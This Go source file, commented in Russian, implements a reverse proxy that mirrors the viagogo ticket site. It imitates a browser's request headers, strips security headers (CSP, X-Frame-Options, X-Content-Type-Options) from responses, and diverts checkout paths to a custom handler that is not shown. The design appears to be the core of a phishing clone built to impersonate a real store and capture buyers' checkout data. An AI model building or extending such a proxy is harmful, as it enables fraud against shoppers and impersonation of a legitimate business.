package proxy

import (
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"

	"trsast/config"
)

type ProxyHandler struct {
	cfg       *config.Config
	client    *http.Client
	targetURL *url.URL
	rewriter  *Rewriter
	checkout  *CheckoutHandler
}

func NewProxyHandler(cfg *config.Config) (*ProxyHandler, error) {
	targetURL, err := url.Parse(cfg.TargetScheme + "://" + cfg.TargetHost)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
			ServerName:  cfg.TargetHost,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 20,
		IdleConnTimeout:     90,
	}

	client := &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &ProxyHandler{
		cfg:       cfg,
		client:    client,
		targetURL: targetURL,
		rewriter:  NewRewriter(cfg),
		checkout:  NewCheckoutHandler(cfg),
	}, nil
}

func (p *ProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("Запрос: %s %s", r.Method, r.URL.String())

	// Статические файлы
	if strings.HasPrefix(r.URL.Path, "/static/") {
		http.StripPrefix("/static/", http.FileServer(http.Dir("static"))).ServeHTTP(w, r)
		return
	}

	// Перехват чекаута
	if p.checkout.ShouldIntercept(r.URL.Path) {
		p.checkout.HandleCheckout(w, r)
		return
	}

	p.proxyRequest(w, r)
}

func (p *ProxyHandler) proxyRequest(w http.ResponseWriter, r *http.Request) {
	proxyURL := *p.targetURL
	proxyURL.Path = r.URL.Path
	proxyURL.RawQuery = r.URL.RawQuery

	proxyReq, err := http.NewRequest(r.Method, proxyURL.String(), r.Body)
	if err != nil {
		log.Printf("Ошибка создания запроса: %v", err)
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}

	// Базовые заголовки, имитируем браузер
	proxyReq.Header.Set("Host", p.cfg.TargetHost)
	proxyReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	proxyReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	proxyReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
	proxyReq.Header.Set("Cache-Control", "no-cache")
	proxyReq.Header.Set("Pragma", "no-cache")

	resp, err := p.client.Do(proxyReq)
	if err != nil {
		log.Printf("Ошибка запроса к viagogo: %v", err)
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	log.Printf("Ответ viagogo: %d, Content-Type: %s", resp.StatusCode, resp.Header.Get("Content-Type"))

	// Копируем заголовки ответа
	for key, values := range resp.Header {
		for _, v := range values {
			w.Header().Add(key, v)
		}
	}

	// Убираем проблемные заголовки безопасности
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Content-Type-Options")

	// Читаем тело
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Ошибка чтения ответа: %v", err)
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}

	log.Printf("Получено байт от viagogo: %d", len(bodyBytes))

	// Пока отдаём как есть, без реврайта
	w.WriteHeader(resp.StatusCode)
	w.Write(bodyBytes)
}